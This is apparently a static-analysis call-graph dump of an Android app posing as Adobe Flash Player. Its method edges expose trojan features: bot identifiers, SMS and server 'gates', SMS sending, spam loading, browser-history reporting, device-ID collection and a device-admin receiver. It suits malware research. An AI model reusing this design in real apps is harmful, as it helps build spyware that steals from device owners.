VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("setFilter[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r4) in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r9 = virtualinvoke $r10.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: $r44 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i2) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashY: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke $r24.<java.lang.String: int length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int length()>
STATIC edge: r6 = staticinvoke <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>($r13, "android_id") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke $r21.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(" ", "_") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r4 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.io.FileOutputStream openFileOutput(java.lang.String,int)>($r1, 0) in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <android.content.ContextWrapper: java.io.FileOutputStream openFileOutput(java.lang.String,int)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r9, r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.app.Service: void onCreate()>
CLINIT edge: staticinvoke <android.view.View: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.View: void <clinit>()>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r41 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>(1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
SPECIAL edge: $r16 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotLocation") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<com.adobe.flashplayer_.AdobeZCore$1: void <init>(com.adobe.flashplayer_.AdobeZCore,long,long)>(r0, 90000L, 10L) in <com.adobe.flashplayer_.AdobeZCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeZCore$1: void <init>(com.adobe.flashplayer_.AdobeZCore,long,long)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Class forName(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=macros_a_good&i=macros_a_data") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.util.TreeMap: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: void <init>()>
VIRTUAL edge: virtualinvoke $r16.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r17) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "On", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r3.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <java.io.OutputStreamWriter: void close()>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("loadSpam") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_ServerGate", $r21, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)>
VIRTUAL edge: $i0 = virtualinvoke r4.<java.lang.String: int indexOf(java.lang.String)>("stop") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r21 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.View findViewById(int)>(2131296259) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: android.view.View findViewById(int)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r0 = staticinvoke <java.util.Calendar: java.util.Calendar getInstance()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)> ==> <java.util.Calendar: java.util.Calendar getInstance()>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.MacrosStat: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: void onCreate()>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.packages.BK: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: $r44 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <android.os.AsyncTask: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.os.AsyncTask: void <clinit>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r52.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(byte[],java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r6 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("keySmsGate") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n-----\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r35 = staticinvoke <android.os.Environment: java.io.File getExternalStorageDirectory()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.Environment: java.io.File getExternalStorageDirectory()>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.admin.DeviceAdminReceiver: void <init>()>() in <com.adobe.flashplayer_.ADOBEcoreZa: void <init>()> ==> <android.app.admin.DeviceAdminReceiver: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r46) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "browserHistory:Executed", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>("pid [%d] process [%s]\r", $r47) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>("a=2&b=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r57.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("c", "1234567890", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)>
